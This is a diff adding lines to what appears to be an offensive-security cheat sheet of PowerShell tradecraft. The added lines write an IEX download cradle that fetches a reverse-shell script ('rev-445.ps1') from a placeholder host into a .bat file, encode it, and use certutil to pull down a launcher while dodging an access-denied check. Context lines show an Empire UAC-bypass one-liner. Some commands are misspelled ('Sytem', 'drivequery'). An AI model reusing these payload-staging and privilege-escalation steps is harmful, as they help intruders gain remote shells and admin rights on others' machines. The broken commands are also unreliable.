@@ -139,9 +139,36 @@ Inveigh
 Unicorn
 
 
- 
 # PowerShell 
 ======================================
+
+PS > echo 'powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString(''https://X.X.X.X/rev-445.ps1'')"' >> XXX.bat
+
+View *.bat File
+===============
+
+PS > $Text = Get-Content XXX.bat
+     $Text ( Enter )
+     
+PS > $bytes = [Sytem.Text.Encoding]::Unicode.GetBytes($Text)
+     $EncodedText = [Convert]::ToBase64String($bytes)
+     $EncodedText ( Enter )
+     certutil -encode clean.bat c:\users\XXX\test
+     
+     type c:\users\XXX\test
+     
+PS > certutil -urlcache -split -f http://X.X.X.X/launcher.ps1 c:\users\XXX\test\launcher.ps1  ( Error Access Denied )
+PS > certutil -urlcache -split -f http://X.X.X.X/launcher.ps1 c:\users\XXX\test\launcher ( Command work vithout ps1 extension )
+
+Copy All Launcher to clean.bat
+==============================
+
+PS > cmd.exe /c "type c:\users\XXX\test\launcher" >> c:\users\XXX\test\clean.bat
+     
+How to clean File into
+======================
+
+PS  > cmd.exe /c "type /y NUL XXX.bat"  
 
 # Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
@@ -188,7 +215,15 @@ Details *.bat Files
 
 [System.IO.File]::Open('C:\Users\XXXX\xxx.bat', [System.IO.FileMode]::Truncate)
 
+Check System 64 or 32 bit 
+==========================
 
+PS  > [Environment]::Is64BitProcess
+
+Drive Query
+===========
+
+cmd.exe /c 'drivequery'
 
 Other use PowerShell
 =====================
